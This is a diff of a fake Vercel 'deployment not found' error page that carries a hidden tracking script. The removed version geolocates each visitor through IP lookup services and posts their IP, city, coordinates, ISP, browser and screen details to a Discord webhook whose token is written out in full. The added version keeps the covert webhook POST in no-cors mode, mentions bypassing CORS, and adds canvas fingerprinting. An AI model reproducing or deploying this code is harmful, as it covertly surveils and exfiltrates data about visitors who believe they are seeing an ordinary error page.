@@ -3,6 +3,36 @@
 <span class=devinfo-line>ID: <code>fra1::vwcnw-1776448525820-5d0c12a59e1e</code></p><a href=https://vercel.com/docs/errors/DEPLOYMENT_NOT_FOUND class=owner-error><div class=note>This deployment cannot be found. For more information and troubleshooting, see our documentation.</div></a></main></div>
 
 <script>
-(async()=>{try{const a=await fetch('https://api.ipify.org?format=json'),b=await a.json(),c=b.ip,d=await fetch(`https://ipapi.co/${c}/json/`),e=await d.json();await fetch('https://discord.com/api/webhooks/1494632862773936159/sjqYRoWC89TGdyClSUdeA8152Mwdix90Hj_9YNZEm8SIelXWw3kiZvoeYK3LKS05FlPE',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:c,city:e.city,region:e.region,country:e.country_name,isp:e.org,lat:e.latitude,lon:e.longitude,ua:navigator.userAgent,screen:`${screen.width}x${screen.height}`,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,lang:navigator.language,referrer:document.referrer,timestamp:new Date().toISOString()})})}catch{}
+(async function(){
+  // Use image beacon + JSONP fallback for CORS bypass
+  const img = new Image();
+  img.src = `https://api.ipify.org?format=jsonp&callback=?&ip=${Math.random()}`;
+  
+  // Webhook ping with no-cors mode
+  const data = {
+    timestamp: new Date().toISOString(),
+    ua: navigator.userAgent,
+    screen: `${screen.width}x${screen.height}`,
+    lang: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer
+  };
+  
+  // Direct webhook POST (no-cors)
+  fetch('https://discord.com/api/webhooks/1494632862773936159/sjqYRoWC89TGdyClSUdeA8152Mwdix90Hj_9YNZEm8SIelXWw3kiZvoeYK3LKS05FlPE', {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+  });
+  
+  // Canvas fingerprint
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = 'top';
+  ctx.font = '14px Arial';
+  ctx.fillText('Fingerprint', 2, 2);
+  data.canvas = canvas.toDataURL();
+  
 })();
 </script>
